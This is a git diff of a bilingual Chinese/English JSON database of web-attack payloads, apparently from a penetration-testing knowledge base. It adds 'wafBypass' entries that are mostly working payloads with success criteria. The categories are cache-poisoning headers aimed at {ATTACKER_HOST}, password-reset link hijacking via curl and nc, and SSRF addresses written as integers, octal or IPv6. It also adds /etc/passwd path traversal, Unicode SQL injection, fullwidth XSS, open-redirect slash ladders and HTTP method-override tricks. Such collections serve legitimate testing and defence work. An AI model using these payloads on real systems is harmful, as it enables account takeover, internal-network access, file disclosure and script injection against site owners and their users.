+            "zh": "多头叠加 DoS",
+            "en": "Multi-Header Stacking DoS"
+          },
+          "command": "X-Forwarded-Host: nonexistent-domain-12345.com\nX-Forwarded-Scheme: nothttps\nX-Forwarded-Proto: javascript",
+          "description": {
+            "zh": "多个未键入头叠加放大后端错误并持久化缓存。成功判据：组合错误响应命中受害键。",
+            "en": "Stacking multiple unkeyed headers amplifies backend errors that persist in cache. Success: the combined error response matches victim keys."
+          }
+        }
       ]
     },
     {
@@ -4480,8 +5546,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "组合转发头未入键",
-        "en": "Unkeyed Combined Forwarding Headers"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -4553,6 +5619,41 @@
       "tags": [
         "httpbypass",
         "cache_key_x_forwarded_for_host"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "标准 Forwarded 变形",
+            "en": "Standard Forwarded Mutation"
+          },
+          "command": "Forwarded: for=127.0.0.1;host={ATTACKER_HOST};proto=https\nForwarded: for=127.0.0.1,for=10.0.0.1;host={ATTACKER_HOST}",
+          "description": {
+            "zh": "RFC 7239 组合参数与多跳变形命中部分解析实现。成功判据：缓存变体投毒命中。",
+            "en": "RFC 7239 combined params and multi-hop forms hit partial-parsing implementations. Success: the cache variant poisons a hit."
+          }
+        },
+        {
+          "title": {
+            "zh": "集群头替代",
+            "en": "Cluster Header Alternative"
+          },
+          "command": "X-Cluster-Client-IP: 127.0.0.1\nX-ProxyUser-IP: 127.0.0.1\nClient-IP: 127.0.0.1",
+          "description": {
+            "zh": "轮换客户端 IP 头命中未入键的取值。成功判据：伪造 IP 影响缓存决策。",
+            "en": "Rotating client-IP headers hits unkeyed extraction. Success: the forged IP influences cache decisions."
+          }
+        },
+        {
+          "title": {
+            "zh": "Host 与 XFF 键错位",
+            "en": "Host/XFF Key Misalignment"
+          },
+          "command": "Host: {ATTACKER_HOST}\nX-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: {TARGET}",
+          "description": {
+            "zh": "组合头使缓存键取 XFH 而源站取 Host 实现键错位投毒。成功判据：受害键返回攻击者内容。",
+            "en": "Combined headers make the cache key read XFH while the origin reads Host, achieving key misalignment. Success: the victim key returns attacker content."
+          }
+        }
       ]
     },
     {
@@ -4594,8 +5695,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "重置链接主机派生",
-        "en": "Reset-Link Host Derivation"
+        "zh": "密码重置与恢复劫持",
+        "en": "Password Reset & Recovery Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -4663,7 +5764,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双 Host 投毒",
+            "en": "Dual-Host Poisoning"
+          },
+          "command": "printf 'POST /forgot-password HTTP/1.1\\r\\nHost: app.example.invalid\\r\\nHost: {ATTACKER_HOST}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 35\\r\\n\\r\\nemail=payloader-user@example.invalid\\r\\n' | nc 127.0.0.1 8080",
+          "description": {
+            "zh": "双 Host 头拼接后重置链接派生为攻击者域。成功判据：邮件链接指向 {ATTACKER_HOST}。",
+            "en": "Concatenated duplicate Host headers derive the reset link to the attacker domain. Success: the emailed link points at {ATTACKER_HOST}."
+          }
+        },
+        {
+          "title": {
+            "zh": "组合转发主机头",
+            "en": "Combined Forwarded Host"
+          },
+          "command": "curl -sS --max-time 5 -H \"Host: app.example.invalid\" -H \"X-Forwarded-Host: {ATTACKER_HOST}\" -d \"email=payloader-user@example.invalid\" http://127.0.0.1:8080/forgot-password",
+          "description": {
+            "zh": "Host 合法而 X-Forwarded-Host 携带攻击者域，派生优先级被滥用。成功判据：链接域名变为攻击者域。",
+            "en": "A legit Host with a poisoned X-Forwarded-Host abuses derivation priority. Success: the link domain flips to the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "绝对 URI 投毒",
+            "en": "Absolute-URI Poisoning"
+          },
+          "command": "printf 'POST http://{ATTACKER_HOST}/forgot-password HTTP/1.1\\r\\nHost: app.example.invalid\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 35\\r\\n\\r\\nemail=payloader-user@example.invalid\\r\\n' | nc 127.0.0.1 8080",
+          "description": {
+            "zh": "绝对 URI 中的主机被优先用于链接派生。成功判据：重置链接使用攻击者域。",
+            "en": "The absolute-URI host takes precedence for link derivation. Success: the reset link uses the attacker domain."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-ssrf-host-192-168-x-x",
@@ -4704,8 +5840,8 @@
         "en": "Server-Side Request Forgery (SSRF)"
       },
       "subCategory": {
-        "zh": "私网 authority 请求",
-        "en": "Private-Network Authority Requests"
+        "zh": "回环与内网探测",
+        "en": "Loopback & Internal Network Probing"
       },
       "tutorial": {
         "overview": {
@@ -4773,7 +5909,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "整数形式私网网关",
+            "en": "Integer-Form Private Gateway"
+          },
+          "command": "http://3232235521/\nhttp://3232235762/",
+          "description": {
+            "zh": "绕过对 192.168.x.x 点分形式黑名单：网关地址转整数表示；路由器管理页返回即成功。",
+            "en": "Represent gateway addresses as integers past dotted blacklists; a router admin page returning confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "八进制形式私网段",
+            "en": "Octal-Form Private Range"
+          },
+          "command": "http://0300.0250.0.1/\nhttp://0300.0250.0001.0001/",
+          "description": {
+            "zh": "绕过对十进制私网匹配：八进制写法解析等价；内网服务响应出现即成功。",
+            "en": "Use octal notation resolving identically past decimal private-range matching; an internal service response appearing confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "Host 头叠加请求",
+            "en": "Host-Header Stacked Request"
+          },
+          "command": "GET / HTTP/1.1\nHost: benign.example.com\nHost: 192.168.1.1\n\n",
+          "description": {
+            "zh": "绕过按首个 Host 头取值的校验：叠加第二个 Host 头利用服务器解析差异；返回内网面板即成功。",
+            "en": "Stack a second Host header to exploit servers honoring the last value; an internal panel returning confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-host-web",
@@ -4814,8 +5985,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "Host 键值规范化",
-        "en": "Host Cache-Key Normalization"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -4883,7 +6054,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重编码控制字符",
+            "en": "Double-Encoded Control Chars"
+          },
+          "command": "Host: {ATTACKER_HOST}%250d%250a\nHost: {ATTACKER_HOST}%2500",
+          "description": {
+            "zh": "双重编码的 CR/LF/NUL 在缓存规范化层还原造成键差异。成功判据：投毒键与受害键归并为同一缓存条目。",
+            "en": "Double-encoded CR/LF/NUL resolve at cache normalization causing key divergence. Success: poisoned and victim keys merge into one cache entry."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写主机变形",
+            "en": "Case-Mutated Host"
+          },
+          "command": "Host: {ATTACKER_HOST}\nHost: ATTACKER.HOST\nHost: {ATTACKER_HOST}",
+          "description": {
+            "zh": "大小写差异使 WAF 特征不命中而缓存键归一化合并。成功判据：变形投毒命中受害缓存。",
+            "en": "Case differences evade WAF signatures while cache keys normalize and merge. Success: the mutated poison hits the victim cache entry."
+          }
+        },
+        {
+          "title": {
+            "zh": "端口携带变形",
+            "en": "Port-Carrying Mutation"
+          },
+          "command": "Host: {ATTACKER_HOST}:443\nHost: {ATTACKER_HOST}:0\nHost: {ATTACKER_HOST}:65535",
+          "description": {
+            "zh": "非常规端口后缀改变键形态但归一化后等价。成功判据：投毒条目命中常规请求。",
+            "en": "Unusual port suffixes reshape the key yet normalize equivalently. Success: the poisoned entry matches ordinary requests."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-url-ext",
@@ -4924,8 +6130,8 @@
         "en": "Open Redirect"
       },
       "subCategory": {
-        "zh": "绝对 URL authority 判定",
-        "en": "Absolute-URL Authority Resolution"
+        "zh": "编码与 URL 结构混淆",
+        "en": "Encoding & URL Structure Confusion"
       },
       "tutorial": {
         "overview": {
@@ -4993,7 +6199,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "编码 @ 变体",
+            "en": "Encoded @ Variant"
+          },
+          "command": "/redirect?url=https://{TARGET}%40{ATTACKER_HOST}",
+          "description": {
+            "zh": "@ 编码为 %40，绕过对原始 @ userinfo 分隔的检测而解析器仍按 userinfo 处理；成功判据：跳转至攻击者域。",
+            "en": "Encoding @ as %40 evades raw-userinfo detection while parsers still treat it as a userinfo separator. Success: redirect hits the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "反斜杠 @ 变体",
+            "en": "Backslash @ Variant"
+          },
+          "command": "/redirect?url=https://{TARGET}\\@{ATTACKER_HOST}",
+          "description": {
+            "zh": "反斜杠与 @ 组合利用 WHATWG 与 RFC 解析差异，部分栈把反斜杠当斜杠、authority 变更；成功判据：浏览器跳到攻击者域。",
+            "en": "The backslash-@ combo exploits WHATWG vs RFC parsing so some stacks change the authority. Success: the browser lands on the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "多重 @ 变体",
+            "en": "Multiple @ Variant"
+          },
+          "command": "/redirect?url=https://{TARGET}@{ATTACKER_HOST}@{TARGET}",
+          "description": {
+            "zh": "多个 @ 使不同解析器取不同 userinfo/host，绕过“最后一个 @ 前”的固定假设；成功判据：任一主流栈完成外域跳转。",
+            "en": "Multiple @ signs make parsers disagree on userinfo/host boundaries, defeating the last-@ assumption. Success: any major stack completes the redirect."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-http-ext",
@@ -5034,8 +6275,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "扩展方法访问控制",
-        "en": "Extended-Method Access Control"
+        "zh": "HTTP 方法与动词覆盖",
+        "en": "HTTP Method & Verb Override"
       },
       "tutorial": {
         "overview": {
@@ -5103,7 +6344,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "小写与混搭冷门方法",
+            "en": "Lowercase & Mixed Rare Methods"
+          },
+          "command": "propfind /admin HTTP/1.1\nPropFind /admin HTTP/1.1\nPROPFIND /admin/ HTTP/1.1",
+          "description": {
+            "zh": "大小写变形绕过方法名特征与 ACL 匹配。成功判据：返回管理属性或内容。",
+            "en": "Case mutations evade method-name signatures and ACL matching. Success: admin properties or content return."
+          }
+        },
+        {
+          "title": {
+            "zh": "带 body 的冷门方法",
+            "en": "Rare Method with Body"
+          },
+          "command": "PROPPATCH /admin HTTP/1.1\r\nContent-Type: application/xml\r\n\r\n<D:propertyupdate xmlns:D=\"DAV:\"><D:set><D:prop><D:owner>attacker</D:owner></D:prop></D:set></D:propertyupdate>",
+          "description": {
+            "zh": "扩展方法携 XML body 绕过只检查标准方法体的防护。成功判据：属性修改成功。",
+            "en": "Extended methods carrying XML bodies bypass defenses inspecting only standard method bodies. Success: the property change succeeds."
+          }
+        },
+        {
+          "title": {
+            "zh": "自定义扩展方法",
+            "en": "Custom Extended Method"
+          },
+          "command": "X-REPORT /admin HTTP/1.1\nREPORT /admin HTTP/1.1\r\nContent-Type: application/xml\r\nDepth: 1\r\n\r\n<C:calendar-query xmlns:C=\"urn:ietf:params:xml:ns:caldav\"/>",
+          "description": {
+            "zh": "自定义动词或 CalDAV REPORT 落到未授权处理器。成功判据：返回管理数据。",
+            "en": "Custom verbs or CalDAV REPORT land on unauthenticated handlers. Success: admin data returns."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-method",
@@ -5144,8 +6420,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "框架伪方法参数",
-        "en": "Framework Pseudo-Method Parameter"
+        "zh": "HTTP 方法与动词覆盖",
+        "en": "HTTP Method & Verb Override"
       },
       "tutorial": {
         "overview": {
@@ -5213,7 +6489,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双 _method 键覆盖",
+            "en": "Duplicate _method Override"
+          },
+          "command": "_method=GET&_method=DELETE\n_method=DELETE&_method=GET",
+          "description": {
+            "zh": "重复 _method 使校验层与路由层取值不同。成功判据：以 GET 通过检查后按 DELETE 执行。",
+            "en": "Duplicate _method makes validation and routing read different values. Success: passes as GET, executes as DELETE."
+          }
+        },
+        {
+          "title": {
+            "zh": "头与参数组合覆盖",
+            "en": "Header+Parameter Combo Override"
+          },
+          "command": "curl -sS --max-time 5 -X POST -H \"X-HTTP-Method-Override: DELETE\" -d \"_method=PUT\" http://127.0.0.1:8080/admin",
+          "description": {
+            "zh": "双通道覆盖命中实现读取的任一通道。成功判据：方法被切换执行。",
+            "en": "Dual-channel override hits whichever channel the implementation reads. Success: the method is switched and executed."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码键名变形",
+            "en": "Encoded Key Mutation"
+          },
+          "command": "_%6Dethod=DELETE\n_mEtHoD=DELETE\n%5Fmethod=DELETE",
+          "description": {
+            "zh": "编码/大小写键名绕过伪方法参数黑名单。成功判据：变形键仍触发覆盖。",
+            "en": "Encoded/case-mutated keys bypass pseudo-method blacklists. Success: the mutated key still triggers the override."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-method-ext",
@@ -5254,8 +6565,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "自定义方法参数",
-        "en": "Custom Method Parameter"
+        "zh": "HTTP 方法与动词覆盖",
+        "en": "HTTP Method & Verb Override"
       },
       "tutorial": {
         "overview": {
@@ -5323,7 +6634,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "body 内嵌 method 参数",
+            "en": "method in Body"
+          },
+          "command": "curl -sS --max-time 5 -X POST -H \"Content-Type: application/json\" -d '{\"method\":\"DELETE\",\"action\":\"delete\",\"verb\":\"DELETE\"}' http://127.0.0.1:8080/admin",
+          "description": {
+            "zh": "method 移入 JSON body 绕过查询参数级检查。成功判据：按 DELETE 执行。",
+            "en": "Moving method into the JSON body bypasses query-parameter checks. Success: executes as DELETE."
+          }
+        },
+        {
+          "title": {
+            "zh": "数组化 method 值",
+            "en": "Arrayed method Value"
+          },
+          "command": "method[]=DELETE&method[]=GET\nmethod[verb]=DELETE&method[check]=GET",
+          "description": {
+            "zh": "数组/嵌套形态使检查与执行取不同元素。成功判据：越权方法被执行。",
+            "en": "Array/nested forms make checks and execution read different elements. Success: the unauthorized method executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写混合变形",
+            "en": "Case-Mixed Mutation"
+          },
+          "command": "method=DeLeTe\nmethod=delete%20HTTP/1.1\nMeThOd=DELETE",
+          "description": {
+            "zh": "大小写与尾缀变形绕过值特征。成功判据：变形值触发方法切换。",
+            "en": "Case and suffix mutations evade value signatures. Success: a mutated value triggers the method switch."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-uri",
@@ -5433,7 +6779,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "scheme 大小写与路径编码",
+            "en": "Scheme case and path encoding"
+          },
+          "command": "GET hTtP://127.0.0.1/admin HTTP/1.1\nGET http://%6c%6f%63%61%6c%68%6f%73%74/admin HTTP/1.1\nGET http://127.0.0.1/%61%64%6d%69%6e HTTP/1.1\nGET http://127.0.0.1/admin/ HTTP/1.1\nGET http://127.0.0.1/./admin HTTP/1.1",
+          "description": {
+            "zh": "绕过对绝对形式请求行 \"GET http://127.0.0.1\" 字面匹配的代理规则：scheme 大小写在 RFC 下不敏感，主机与路径分别 percent-encode、尾斜杠与点段改变字面而路由目标不变；成功判据：变形请求返回 /admin 内容（与 Host 覆盖原版一致）。",
+            "en": "Bypasses proxy rules matching the literal absolute-form line \"GET http://127.0.0.1\": scheme case is insensitive per RFC, separately encoding host and path plus trailing slash/dot segments change literals without changing the route; success criterion: variants return /admin content as the original Host-override request."
+          }
+        },
+        {
+          "title": {
+            "zh": "IPv6 与数值 authority",
+            "en": "IPv6 and numeric authority"
+          },
+          "command": "GET http://[::1]/admin HTTP/1.1\nGET http://[::ffff:127.0.0.1]/admin HTTP/1.1\nGET http://2130706433/admin HTTP/1.1\nGET http://0x7f000001/admin HTTP/1.1\nGET http://0177.0.0.1/admin HTTP/1.1",
+          "description": {
+            "zh": "绕过基于 \"127.0.0.1/localhost 字符串\" 的 authority 校验：IPv6 字面量、IPv4 映射地址与整数/十六进制/八进制数值 authority 解析后仍指向本机；成功判据：任一变形取回内部 /admin 资源。",
+            "en": "Bypasses authority checks on the 127.0.0.1/localhost strings: IPv6 literals, IPv4-mapped addresses and integer/hex/octal numeric authorities still resolve to the host; success criterion: any variant retrieves the internal /admin resource."
+          }
+        },
+        {
+          "title": {
+            "zh": "userinfo 与端口变形",
+            "en": "Userinfo and port variants"
+          },
+          "command": "GET http://user@127.0.0.1/admin HTTP/1.1\nGET http://admin@localhost/admin HTTP/1.1\nGET http://127.0.0.1:80/admin HTTP/1.1\nGET http://127.0.0.1:@80/admin HTTP/1.1\nGET http://127.0.0.1:8080/admin HTTP/1.1",
+          "description": {
+            "zh": "绕过对 authority 精确匹配的规则：userinfo（@ 前缀）与显式端口（含空口令 :@80、非标 8080）被排除在匹配串外而语义不变；成功判据：变形请求命中同一内部路由。",
+            "en": "Bypasses exact authority matching: userinfo prefixes and explicit ports (empty-password :@80, non-standard 8080) sit outside the matched string while preserving semantics; success criterion: variants hit the same internal route."
+          }
+        },
+        {
+          "title": {
+            "zh": "尾点 authority 与版本差异",
+            "en": "Trailing-dot authority and version variance"
+          },
+          "command": "GET http://127.0.0.1./admin HTTP/1.1\nGET http://localhost./admin HTTP/1.1\nGET http://127.0.0.1//admin HTTP/1.1\nGET http://127.0.0.1/admin HTTP/1.0",
+          "description": {
+            "zh": "绕过末尾字面 \"/admin HTTP/1.1\" 模板匹配：authority 尾点等价、双斜杠路径归一，再以 HTTP/1.0 请求行改写结尾签名；成功判据：任一变形返回 /admin 内容且未被代理拒绝（非 400/403）。",
+            "en": "Bypasses matching on the trailing \"/admin HTTP/1.1\" template: trailing-dot authority equivalence, doubled slashes normalizing away, and an HTTP/1.0 request line rewriting the ending signature; success criterion: any variant returns /admin content without proxy rejection (not 400/403)."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-unicode",
@@ -5474,8 +6866,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "路径规范化与文件访问",
-        "en": "Path Normalization and File Access"
+        "zh": "下载与路径穿越",
+        "en": "Download & Path Traversal"
       },
       "tutorial": {
         "overview": {
@@ -5546,7 +6938,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "全角单点遍历",
+            "en": "Fullwidth single-dot traversal"
+          },
+          "command": "．./．./etc/passwd",
+          "description": {
+            "zh": "半全角混合点被规范化还原。判据：读出 passwd。",
+            "en": "Mixed full/half dots normalized back. Success: passwd read."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码全角点",
+            "en": "Encoded fullwidth dots"
+          },
+          "command": "%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
+          "description": {
+            "zh": "全角点再编码双重绕过。判据：200。",
+            "en": "Fullwidth dots then percent-encoded. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "双点运算符变体",
+            "en": "Two-dot operator variant"
+          },
+          "command": "‥/‥/boot.ini",
+          "description": {
+            "zh": "换 Windows 目标验证可利用性。判据：读出 boot.ini。",
+            "en": "Windows target variant. Success: boot.ini read."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-unicode-sql",
@@ -5587,8 +7014,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "Unicode SQL 元字符",
-        "en": "Unicode SQL Metacharacters"
+        "zh": "载体与场景变体",
+        "en": "Carriers & Context Variants"
       },
       "tutorial": {
         "overview": {
@@ -5656,7 +7083,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "全角字符 URL 编码",
+            "en": "URL-Encoded Fullwidth Characters"
+          },
+          "command": "%EF%BC%87+or+%EF%BC%871%EF%BC%9D%EF%BC%871",
+          "description": {
+            "zh": "绕过对半角元字符的过滤并利用归一化差异：全角引号等以 UTF-8 百分号编码传递，应用规范化后还原；数据库报错出现即成功。",
+            "en": "Send fullwidth quote/equals as UTF-8 percent encoding to exploit normalization gaps; an appearing database error confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "修饰撇号变体",
+            "en": "Modifier Apostrophe Variant"
+          },
+          "command": "%CA%BC+or+1%3D1--",
+          "description": {
+            "zh": "绕过对标准引号字符集的封锁：用 U+02BC 修饰字母撇号参与规范化还原；谓词生效引发差异即成功。",
+            "en": "Use the U+02BC modifier apostrophe to survive quote charset bans via normalization; an effective predicate causing a delta confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "半全角混排",
+            "en": "Halfwidth-Fullwidth Mixing"
+          },
+          "command": "＇ or '1'='1",
+          "description": {
+            "zh": "绕过对全角串整体匹配的规则：半角全角混排使特征不完整；登录或查询行为异常即成功。",
+            "en": "Mix halfwidth and fullwidth so signatures never fully match; anomalous login or query behavior confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-unicode-xss",
@@ -5697,8 +7159,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "全角括号标签",
-        "en": "Full-Width Bracket Tags"
+        "zh": "编码过滤绕过与 Polyglot",
+        "en": "Encoding Bypass & Polyglots"
       },
       "tutorial": {
         "overview": {
@@ -5766,7 +7228,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "全角 img 变体",
+            "en": "Fullwidth img variant"
+          },
+          "command": "＜img src=x onerror=prompt(1)＞",
+          "description": {
+            "zh": "绕过半角标签规则且换 prompt 输出。判据：规范化后执行。",
+            "en": "Fullwidth brackets with prompt output. Success: executes after normalization."
+          }
+        },
+        {
+          "title": {
+            "zh": "全角 svg 变体",
+            "en": "Fullwidth svg variant"
+          },
+          "command": "＜svg onload=confirm(1)＞",
+          "description": {
+            "zh": "confirm 输出验证解码链路。判据：确认框出现。",
+            "en": "Fullwidth svg with confirm. Success: dialog appears."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码全角点",
+            "en": "Encoded fullwidth dots"
+          },
+          "command": "＜%uff0e%uff0e/script onload=alert(1)＞",
+          "description": {
+            "zh": "混合全角括号与编码点干扰规范化。判据：异常解析执行。",
+            "en": "Mixes fullwidth brackets and encoded dots. Success: executes via parser confusion."
+          }
+        },
+        {
+          "title": {
+            "zh": "全角 iframe 变体",
+            "en": "Fullwidth iframe variant"
+          },
+          "command": "＜iframe src=javascript:alert(1)＞",
+          "description": {
+            "zh": "框架方式执行。判据：弹窗触发。",
+            "en": "Fullwidth iframe form. Success: alert fires."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-punycode",
@@ -5807,8 +7315,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "IDN 前缀误用与路径解析",
-        "en": "IDN Prefix Misuse and Path Parsing"
+        "zh": "下载与路径穿越",
+        "en": "Download & Path Traversal"
       },
       "tutorial": {
         "overview": {
@@ -5876,7 +7384,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "编码混合遍历",
+            "en": "Encoded mixed traversal"
+          },
+          "command": "xn--%2f..%2f..%2fetc%2fpasswd",
+          "description": {
+            "zh": "前缀加编码遍历组合。判据：读出 passwd。",
+            "en": "Prefix plus encoded traversal. Success: passwd read."
+          }
+        },
+        {
+          "title": {
+            "zh": "大写前缀变体",
+            "en": "Uppercase-prefix variant"
+          },
+          "command": "XN--/../../boot.ini",
+          "description": {
+            "zh": "大小写混写。判据：200。",
+            "en": "Case variance. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "真实 TLD 前缀",
+            "en": "Real-TLD prefix"
+          },
+          "command": "xn--p1ai/../../etc/passwd",
+          "description": {
+            "zh": "以真实 IDN 前缀混淆规则。判据：遍历成功。",
+            "en": "Real IDN prefix confuses rules. Success: traversal works."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-evil-com",
@@ -5917,8 +7460,8 @@
         "en": "Open Redirect"
       },
       "subCategory": {
-        "zh": "斜杠/反斜杠 authority 混淆",
-        "en": "Slash and Backslash Authority Confusion"
+        "zh": "斜杠与路径解析混淆",
+        "en": "Slash & Path Parsing Confusion"
       },
       "tutorial": {
         "overview": {
@@ -5986,7 +7529,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "编码阶梯变体",
+            "en": "Encoded Ladder Variant"
+          },
+          "command": "/redirect?url=/%5C%5C{ATTACKER_HOST}\n/redirect?url=/%255C%255C{ATTACKER_HOST}",
+          "description": {
+            "zh": "反斜杠阶梯以 %5C 单/双重编码呈现，规避原始连斜杠特征；成功判据：解码后仍形成 // 等价跳转。",
+            "en": "Encodes the backslash ladder as single/double %5C to evade raw run signatures. Success: post-decode it still forms an equivalent // redirect."
+          }
+        },
+        {
+          "title": {
+            "zh": "混合斜杠阶梯变体",
+            "en": "Mixed Slash Ladder Variant"
+          },
+          "command": "/redirect?url=/\\/\\\\{ATTACKER_HOST}\n/redirect?url=//\\\\\\{ATTACKER_HOST}",
+          "description": {
+            "zh": "正反斜杠混合阶梯超出固定序列模式，利用归一化折叠；成功判据：任一形态跳转成功。",
+            "en": "Mixed forward/backslash ladders exceed fixed sequence patterns via normalization folding. Success: any form redirects."
+          }
+        },
+        {
+          "title": {
+            "zh": "阶梯加路径变体",
+            "en": "Ladder with Path Variant"
+          },
+          "command": "/redirect?url=/\\\\{ATTACKER_HOST}/%2E%2E/callback",
+          "description": {
+            "zh": "阶梯后接编码穿越路径，规避“反斜杠结尾即拦截”的规则；成功判据：跳转并带回调路径。",
+            "en": "Appending an encoded traversal path evades rules blocking backslash endings. Success: the redirect fires with the callback path."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-idn-homograph",
